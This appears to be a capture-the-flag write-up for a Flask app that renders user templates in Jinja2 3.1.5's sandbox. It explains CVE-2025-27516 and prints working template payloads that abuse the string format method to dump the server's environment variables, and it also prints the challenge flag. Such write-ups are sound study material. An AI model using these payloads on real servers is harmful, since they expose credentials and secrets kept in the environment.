---
title: Greetings 🐍
description: A Python/Jinja2 SSTI challenge using SandboxedEnvironment.
date: 2026-05-11 00:00 +/-TTTT
categories: [CTF Writeups, DDC]
tags: [DDC, Web Exploitation, Python, Flask, Jinja2, SSTI]
---

{: .prompt-warning }
> This writeup is WIP and may be incomplete.

## 🗒️ Challenge Description

> So you think you know everything about python SSTI? We'll see about that!
>
> `http://greetings.cfire:5000`

Handout:

```text
Flask
Jinja2==3.1.5
```

## 🧭 Scope

- Target: `http://greetings.cfire:5000`
- Category: Web exploitation
- Focus: Python SSTI in Jinja2's `SandboxedEnvironment`
- Goal: Escape the sandbox and recover the flag

## 📦 Handout

The challenge source is short and only contains an `app.py`. It is a simple Flask server using Jinja2's `SandboxedEnvironment`, and it lets the user write and render their own server-side templates.

## 🌐 First Look

The page lets us submit two values:

- `name`, which is passed into the template context.
- `template`, which is rendered directly by Jinja2.

Writing a template like `{% raw %}`{{ 6*7 }}`{% endraw %}` renders the expected `42`, which confirms server-side template injection.

## 🧪 Vulnerable requirements

Looking at the requirements file, the Jinja2 version is pinned to `3.1.5`. That is not the latest version, which is a pretty loud hint that the challenge might rely on a known vulnerability.

A quick search for "Jinja2 3.1.5 vulnerabilities" reveals [CVE-2025-27516](https://nvd.nist.gov/vuln/detail/CVE-2025-27516), a sandbox breakout in Jinja2's `SandboxedEnvironment`. That matches the challenge setup perfectly.

Searching for a ready-made PoC did not immediately give me much. But the NVD entry links to the GitHub commit that fixed the vulnerability. Even better, the fix includes a test case that demonstrates the issue:

[pallets/jinja commit 48b0687](https://github.com/pallets/jinja/commit/48b0687e05a5466a91cd5812d604fa37ad0943b4)

The test contains this payload:

{% raw %}
```python
env = SandboxedEnvironment()
t = env.from_string(
    """{{ "{0.__call__.__builtins__[__import__]}"
          | attr("format")(not_here) }}"""
)
```
{% endraw %}

The vulnerability is that using `|attr` to get the `format` method of a string bypasses the normal sandbox checks around `str.format`.

At first, this feels a lot like a Python jail. Usually, one way to escape a Python jail is to reach `__import__`, import the `os` module, and then use something like `os.popen()` to execute commands.

However, in this case, the `str.format` field syntax only gives us attribute and item access. We cannot just call functions inside the format field. So instead of trying to execute commands, the better target is readable data already exposed through Python objects.

That led me to `os.environ`, which contains the flag.

## 🧪 Payload

This payload walks through the loader globals to reach the already-loaded `sys` module, then uses `sys.modules` to access `os.environ`:

{% raw %}
```python
{{ ("{0.__init__.__globals__[__loader__].load_module.__globals__[sys].modules[os].environ}" | attr("format")(hi)) }}
```
{% endraw %}

That dumps the full environment, including the `FLAG` variable. A cleaner version reads only the flag:

{% raw %}
```python
{{ ("{0.__init__.__globals__[__loader__].load_module.__globals__[sys].modules[os].environ[FLAG]}" | attr("format")(hi)) }}
```
{% endraw %}

## 🚩 Flag

```text
DDC{sandboxes_are_meant_to_be_escaped_03826567e490b821}
```

## 🤓 TL;DR

1. Confirmed SSTI with `{% raw %}`{{ 6*7 }}`{% endraw %}`, which rendered `42`.
2. Noticed the handout pins Jinja2 to `3.1.5`.
3. Found CVE-2025-27516, a `SandboxedEnvironment` breakout using `|attr("format")`.
4. Used Python format-field traversal to reach `sys.modules[os].environ`.
5. Read the `FLAG` environment variable.
